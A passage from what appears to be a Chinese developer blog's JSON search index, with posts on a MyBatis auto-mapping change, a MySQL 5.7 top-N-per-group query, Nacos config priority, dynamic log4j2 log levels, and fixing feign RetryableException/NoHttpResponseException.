rsw.getTypeHandler(propertyType, columnName);</span><br><span class=\"line\">          autoMapping.add(<span class=\"keyword\">new</span> <span class=\"title class_\">UnMappedColumnAutoMapping</span>(columnName, property, typeHandler, propertyType.isPrimitive()));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          configuration.getAutoMappingUnknownColumnBehavior()</span><br><span class=\"line\">                  .doAction(mappedStatement, columnName, property, propertyType);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        configuration.getAutoMappingUnknownColumnBehavior()</span><br><span class=\"line\">                .doAction(mappedStatement, columnName, (property != <span class=\"literal\">null</span>) ? property : propertyName, <span class=\"literal\">null</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    autoMappingsCache.put(mapKey, autoMapping);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> autoMapping;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根本原理就是新版本里面加了一个判断，如果设置了映射就会走映射。</p>\n","tags":["开发异常"]},{"title":"mysql5.7分组后查前4条","url":"/2024/06/07/mysql5-7%E5%88%86%E7%BB%84%E5%90%8E%E6%9F%A5%E5%89%8D4%E6%9D%A1/","content":"<p>最近有一条sql因为jar依赖的问题导致异常，以前旧版本是正常的，如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">-- 建表</span></span><br><span class=\"line\"><span class=\"keyword\">create table</span> fresh_product(</span><br><span class=\"line\">    id <span class=\"type\">bigint</span> auto_increment <span class=\"keyword\">primary key</span> ,</span><br><span class=\"line\">    activity_id <span class=\"type\">bigint</span> <span class=\"keyword\">not null</span> <span class=\"keyword\">default</span> <span class=\"number\">0</span>,</span><br><span class=\"line\">    product_id <span class=\"type\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">not null</span> <span class=\"keyword\">default</span> <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 查询每个activity_id前4条</span></span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"variable\">@lineNum</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>, <span class=\"variable\">@activityId</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> activity_id activityId, goodsNo</span><br><span class=\"line\"><span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> activity_id,<span class=\"keyword\">CONVERT</span>(product_id,SIGNED) goodsNo,</span><br><span class=\"line\">             <span class=\"variable\">@lineNum</span> :<span class=\"operator\">=</span> IF(<span class=\"variable\">@activityId</span> <span class=\"operator\">=</span> activity_id, <span class=\"variable\">@lineNum</span> <span class=\"operator\">+</span> <span class=\"number\">1</span>, <span class=\"number\">1</span>) <span class=\"keyword\">as</span> lineNum,</span><br><span class=\"line\">             <span class=\"variable\">@activityId</span> :<span class=\"operator\">=</span> activity_id  t</span><br><span class=\"line\">      <span class=\"keyword\">from</span> fresh_product <span class=\"keyword\">where</span> activity_id <span class=\"keyword\">in</span></span><br><span class=\"line\">        (<span class=\"number\">10000745</span>,<span class=\"number\">10000738</span>, <span class=\"number\">10000732</span>)</span><br><span class=\"line\">      <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> activity_id <span class=\"keyword\">asc</span>,goodsNo <span class=\"keyword\">desc</span>) tmp</span><br><span class=\"line\"><span class=\"keyword\">where</span> tmp.lineNum <span class=\"operator\">&lt;=</span> <span class=\"number\">4</span>;</span><br></pre></td></tr></table></figure>\n<p>现在需要改造该sql，改造如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> SUBSTRING_INDEX(SUBSTRING_INDEX(t.product_ids, <span class=\"string\">&#x27;,&#x27;</span>, nums.n), <span class=\"string\">&#x27;,&#x27;</span>, <span class=\"number\">-1</span>) id,t.activity_id</span><br><span class=\"line\"><span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span> n</span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"keyword\">all</span></span><br><span class=\"line\">    <span class=\"keyword\">select</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"keyword\">all</span></span><br><span class=\"line\">    <span class=\"keyword\">select</span> <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"keyword\">all</span></span><br><span class=\"line\">    <span class=\"keyword\">select</span> <span class=\"number\">4</span>) nums</span><br><span class=\"line\">        <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span></span><br><span class=\"line\">    (<span class=\"keyword\">select</span> substring_index(group_concat(product_id <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> product_id <span class=\"keyword\">desc</span>), <span class=\"string\">&#x27;,&#x27;</span>, <span class=\"number\">400</span>) product_ids, activity_id</span><br><span class=\"line\">    <span class=\"keyword\">from</span> fresh_product <span class=\"keyword\">where</span> activity_id <span class=\"keyword\">in</span> (<span class=\"number\">10000745</span>,<span class=\"number\">10000738</span>, <span class=\"number\">10000732</span>)</span><br><span class=\"line\">    <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> activity_id) t <span class=\"keyword\">on</span> <span class=\"keyword\">CHAR_LENGTH</span>(t.product_ids)</span><br><span class=\"line\">                                    <span class=\"operator\">-</span> <span class=\"keyword\">CHAR_LENGTH</span>(REPLACE(t.product_ids, <span class=\"string\">&#x27;,&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)) <span class=\"operator\">&gt;=</span> nums.n <span class=\"operator\">-</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>新sql看起来更复杂了，先是group by后group_concat数据，然后把逗号分割的列转换为行。<br>这种处理方法有一点问题是，group_concat如果太长会截取一部分。如果取的前几个较多，会取不到数据，截取长度可配置。</p>\n","tags":["mysql"]},{"title":"spring cloud 集成nacos后配置加载优先级","url":"/2024/08/16/spring-cloud-%E9%9B%86%E6%88%90nacos%E5%90%8E%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%85%88%E7%BA%A7/","content":"<p>项目中使用nacos统一管理配置，在本地开发时需要修改配置，发现启动时添加<code>-Dxx=xx</code>并不生效。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span>  <span class=\"title class_\">org</span>.springframework.cloud.bootstrap.config.PropertySourceBootstrapConfiguration</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取到nacos的`PropertySource`</span></span><br><span class=\"line\">doInitialize</span><br><span class=\"line\"><span class=\"comment\">//设置优先级</span></span><br><span class=\"line\">insertPropertySources</span><br></pre></td></tr></table></figure>\n<p>通过上述nacos里面<code>PropertySources</code>获取如下属性来判配置优先级</p>\n<ul>\n<li>spring.cloud.config.allowOverride (默认true)</li>\n<li>spring.cloud.config.overrideNone (默认false)</li>\n<li>spring.cloud.config.overrideSystemProperties (默认true)</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>allowOverride</th>\n<th>overrideNone</th>\n<th>overrideSystemProperties</th>\n<th>nacos优先级</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>false</td>\n<td>-</td>\n<td>-</td>\n<td>最高</td>\n</tr>\n<tr>\n<td>true</td>\n<td>false</td>\n<td>true</td>\n<td>默认，最高</td>\n</tr>\n<tr>\n<td>-</td>\n<td>true</td>\n<td>-</td>\n<td>最低</td>\n</tr>\n<tr>\n<td>-</td>\n<td>-</td>\n<td>true</td>\n<td>高于<code>systemEnvironment</code></td>\n</tr>\n<tr>\n<td>-</td>\n<td>-</td>\n<td>false</td>\n<td>低于<code>systemEnvironment</code></td>\n</tr>\n<tr>\n<td>-</td>\n<td>-</td>\n<td>-</td>\n<td>最低</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>上述判断是从上往下判断，匹配就直接执行<br>如果存在<code>systemEnvironment</code>才会依据<code>overrideSystemProperties</code>判断相对<code>systemEnvironment</code>优先级</p>\n</blockquote>\n","tags":["spring cloud","nacos"]},{"title":"动态日志调整","url":"/2024/12/12/%E5%8A%A8%E6%80%81%E6%97%A5%E5%BF%97%E8%B0%83%E6%95%B4/","content":"<p>项目上线后，在出现问题时经常需要查线上日志，特殊情况需要查看<em>debug</em>级别日志才能找到问题，这就需要能动态调整日志。</p>\n<span id=\"more\"></span>\n<h3 id=\"日志链路记录\"><a href=\"#日志链路记录\" class=\"headerlink\" title=\"日志链路记录\"></a>日志链路记录</h3><p>日志配置文件中添加添加<em>traceId</em></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Configuration</span> <span class=\"attr\">status</span>=<span class=\"string\">&quot;WARN&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Appenders</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">Console</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;Console&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">PatternLayout</span> <span class=\"attr\">pattern</span>=<span class=\"string\">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; %X&#123;traceId&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">Console</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">Appenders</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Loggers</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">Root</span> <span class=\"attr\">level</span>=<span class=\"string\">&quot;info&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">AppenderRef</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;Console&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">Root</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">Logger</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;com.whhxz.blogexample.log4j2.trace&quot;</span> <span class=\"attr\">level</span>=<span class=\"string\">&quot;info&quot;</span> <span class=\"attr\">additivity</span>=<span class=\"string\">&quot;false&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">AppenderRef</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;Console&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">Logger</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">Loggers</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在拦截器里向MDC添加<em>traceId</em></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123;&quot;UastIncorrectHttpHeaderInspection&quot;, &quot;NullableProblems&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">LogTraceInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">HandlerInterceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">traceId</span> <span class=\"operator\">=</span> request.getHeader(<span class=\"string\">&quot;x-trace-id&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (traceId == <span class=\"literal\">null</span> || traceId.isEmpty()) &#123;</span><br><span class=\"line\">            traceId = UUID.randomUUID().toString().replace(<span class=\"string\">&quot;-&quot;</span>, <span class=\"string\">&quot;&quot;</span>).substring(<span class=\"number\">0</span>, <span class=\"number\">12</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        MDC.put(<span class=\"string\">&quot;traceId&quot;</span>, traceId);</span><br><span class=\"line\">        <span class=\"comment\">//此处只能设置在这里，不能设置在postHandler和afterCompletion里</span></span><br><span class=\"line\">        <span class=\"comment\">//因为那时候response可能已经返回了，再设置无效</span></span><br><span class=\"line\">        response.addHeader(<span class=\"string\">&quot;x-trace-id&quot;</span>, traceId);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">afterCompletion</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        MDC.remove(<span class=\"string\">&quot;traceId&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>除了在拦截器里面处理还可以在<em>Filter</em>里面处理。</p>\n<h3 id=\"通过DynamicThresholdFilter调整日志级别\"><a href=\"#通过DynamicThresholdFilter调整日志级别\" class=\"headerlink\" title=\"通过DynamicThresholdFilter调整日志级别\"></a>通过<strong>DynamicThresholdFilter</strong>调整日志级别</h3><p>希望请求Header添加某个参数时能调整当前线程的日志级别，在DynamicThresholdFilter中可以配置。</p>\n<h4 id=\"xml中配置Filter\"><a href=\"#xml中配置Filter\" class=\"headerlink\" title=\"xml中配置Filter\"></a>xml中配置Filter</h4><p>在<strong>Configuration</strong>节点下添加</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">DynamicThresholdFilter</span> <span class=\"attr\">key</span>=<span class=\"string\">&quot;x-log-level&quot;</span> <span class=\"attr\">defaultThreshold</span>=<span class=\"string\">&quot;INFO&quot;</span> <span class=\"attr\">onMatch</span>=<span class=\"string\">&quot;ACCEPT&quot;</span> <span class=\"attr\">onMismatch</span>=<span class=\"string\">&quot;NEUTRAL&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">KeyValuePair</span> <span class=\"attr\">key</span>=<span class=\"string\">&quot;trace&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;TRACE&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">KeyValuePair</span> <span class=\"attr\">key</span>=<span class=\"string\">&quot;debug&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;DEBUG&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">DynamicThresholdFilter</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上面表示从<strong>ThreadContext</strong>获取<strong>x-log-level</strong>，如果匹配了就接受，不匹配不处理，也可配置<strong>DENY</strong>阻塞。<br>如果匹配了<strong>KeyValuePair</strong>中配置的key，那么使用对应的日志。</p>\n<p>同样配置拦截器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&quot;NullableProblems&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DynamicLogLevelInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">HandlerInterceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">logLevel</span> <span class=\"operator\">=</span> request.getHeader(<span class=\"string\">&quot;x-log-level&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (logLevel != <span class=\"literal\">null</span> &amp;&amp; !logLevel.isEmpty()) &#123;</span><br><span class=\"line\">            MDC.put(<span class=\"string\">&quot;x-log-level&quot;</span>, logLevel.toLowerCase(Locale.ROOT));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">afterCompletion</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        MDC.remove(<span class=\"string\">&quot;x-log-level&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面设置<strong>x-log-level</strong>和xml中配置的一样，然后定义日志级别。</p>\n<h4 id=\"Java中配置Filter\"><a href=\"#Java中配置Filter\" class=\"headerlink\" title=\"Java中配置Filter\"></a>Java中配置Filter</h4><p>在有时候，不方便直接修改xml，可以通过Java代码添加Filter</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.Level;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.core.Filter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.core.LoggerContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.core.filter.DynamicThresholdFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.logging.log4j.core.util.KeyValuePair;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.slf4j.MDC;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Locale;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&quot;NullableProblems&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DynamicLogLevelInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">HandlerInterceptor</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"type\">boolean</span> <span class=\"variable\">init</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">preHandle</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">logLevel</span> <span class=\"operator\">=</span> request.getHeader(<span class=\"string\">&quot;x-log-level&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (logLevel != <span class=\"literal\">null</span> &amp;&amp; !logLevel.isEmpty()) &#123;</span><br><span class=\"line\">            initLogFilter();</span><br><span class=\"line\">            MDC.put(<span class=\"string\">&quot;x-log-level&quot;</span>, logLevel.toLowerCase(Locale.ROOT));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">afterCompletion</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        MDC.remove(<span class=\"string\">&quot;x-log-level&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">initLogFilter</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//验证是否初始化完成</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (init) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (obj) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (init) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">//需要先获取LoggerContext，如果有对日志做二次开发，需要想办法从其他地方获取</span></span><br><span class=\"line\">            <span class=\"type\">LoggerContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> LoggerContext.getContext(<span class=\"literal\">false</span>);</span><br><span class=\"line\">            <span class=\"comment\">//配置值对应日志</span></span><br><span class=\"line\">            <span class=\"type\">KeyValuePair</span> <span class=\"variable\">tracePair</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">KeyValuePair</span>(<span class=\"string\">&quot;trace&quot;</span>, <span class=\"string\">&quot;TRACE&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">KeyValuePair</span> <span class=\"variable\">debugPair</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">KeyValuePair</span>(<span class=\"string\">&quot;debug&quot;</span>, <span class=\"string\">&quot;DEBUG&quot;</span>);</span><br><span class=\"line\">            KeyValuePair[] pairs = &#123;tracePair, debugPair&#125;;</span><br><span class=\"line\">            <span class=\"type\">DynamicThresholdFilter</span> <span class=\"variable\">filter</span> <span class=\"operator\">=</span> DynamicThresholdFilter.createFilter(<span class=\"string\">&quot;x-log-level&quot;</span>, pairs, Level.INFO, Filter.Result.ACCEPT, Filter.Result.NEUTRAL);</span><br><span class=\"line\"></span><br><span class=\"line\">            context.addFilter(filter);</span><br><span class=\"line\">            <span class=\"comment\">//更新</span></span><br><span class=\"line\">            context.updateLoggers();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        init = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>上述是针对<strong>log4j2</strong>，如果项目中使用<strong>logback</strong>，基本原理一样。</p>\n","tags":["日志"]},{"title":"feign异常feign.RetryableException & NoHttpResponseException","url":"/2025/03/04/feign%E5%BC%82%E5%B8%B8feign-RetryableException-NoHttpResponseException/","content":"<p>系统总是出现<code>feign.RetryableException</code>，需要找到原因并解决，虽然问题不大，但是一直有这个异常日志。<br>项目采用的是<code>spring-cloud-starter-openfeign</code>自动注入、<code>apache httpclient</code>做连接池。并没有对配置做相关优化，采用默认配置。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"feign-RetryableException定位\"><a href=\"#feign-RetryableException定位\" class=\"headerlink\" title=\"feign.RetryableException定位\"></a>feign.RetryableException定位</h3><p>通过异常栈定位到问题出在<code>feign.SynchronousMethodHandler#invoke</code>内调用<code>executeAndDecode</code>。执行请求出现异常后抛出。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Object <span class=\"title function_\">invoke</span><span class=\"params\">(Object[] argv)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">  <span class=\"type\">RequestTemplate</span> <span class=\"variable\">template</span> <span class=\"operator\">=</span> buildTemplateFromArgs.create(argv);</span><br><span class=\"line\">  <span class=\"type\">Options</span> <span class=\"variable\">options</span> <span class=\"operator\">=</span> findOptions(argv);</span><br><span class=\"line\">  <span class=\"type\">Retryer</span> <span class=\"variable\">retryer</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.retryer.clone();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">//执行请求，里面有抛出RetryableException</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> executeAndDecode(template, options);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RetryableException e) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//异常后，通过相关配置判断是否需要处理</span></span><br><span class=\"line\">        retryer.continueOrPropagate(e);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">catch</span> (RetryableException th) &#123;</span><br><span class=\"line\">        <span class=\"type\">Throwable</span> <span class=\"variable\">cause</span> <span class=\"operator\">=</span> th.getCause();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (propagationPolicy == UNWRAP &amp;&amp; cause != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">throw</span> cause;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">throw</span> th;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (logLevel != Logger.Level.NONE) &#123;</span><br><span class=\"line\">        logger.logRetry(metadata.configKey(), logLevel);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>默认情况下<code>feign</code>配置重试机制使用的是<code>feign.Retryer.Default</code>，默认重试<strong>5</strong>次。<br>在使用了<code>SpringBoot</code>自动配置后，在<code>org.springframework.cloud.openfeign.FeignClientsConfiguration#feignRetryer</code>可以看到默认使用的是<code>feign.Retryer#NEVER_RETRY</code>，里面是不做重试直接抛出异常。那就可以看到为什么请求失败会出现<code>feign.RetryableException</code>。</p>\n<h3 id=\"NoHttpResponseException-定位\"><a href=\"#NoHttpResponseException-定位\" class=\"headerlink\" title=\"NoHttpResponseException 定位\"></a>NoHttpResponseException 定位</h3><p>在上面<code>feign</code>异常栈的后面可以看到<code>NoHttpResponseException</code>异常，通过异常栈可以看到代码<code>org.apache.http.impl.conn.DefaultHttpResponseParser#parseHead</code>处抛出的异常，是读取返回时出错抛出。</p>\n<p>从stackoverflow <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTA1NTg3OTEvYXBhY2hlLWh0dHBjbGllbnQtaW50ZXJpbS1lcnJvci1ub2h0dHByZXNwb25zZWV4Y2VwdGlvbg==\">Apache HttpClient Interim Error: NoHttpResponseException<i class=\"fa fa-external-link-alt\"></i></span>里面可以看到，根本原因是因为使用了过期连接导致。</p>\n<p>解决办法：</p>\n<ul>\n<li>官方建议<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYy5hcGFjaGUub3JnL2h0dHBjb21wb25lbnRzLWNsaWVudC00LjUueC9jdXJyZW50L3R1dG9yaWFsL2h0bWwvY29ubm1nbXQuaHRtbCNkNWU0MTg=\">定时清理<i class=\"fa fa-external-link-alt\"></i></span>过期连接。</li>\n<li>设置自定义重试次数。</li>\n<li>使用okhttp替换<code>apache httpclient</code>。</li>\n</ul>\n<blockquote>\n<p>使用<code>okhttp</code>添加配置<code>feign.httpclient.enabled=false</code>，避免第三方依赖了<code>feign-httpclient</code>，如果确认没有依赖可以不需要<br>添加<code>feign.okhttp.enabled=true</code>启动okhttp</p>\n</blockquote>\n","tags":["feign","EXception","apache http client"]}]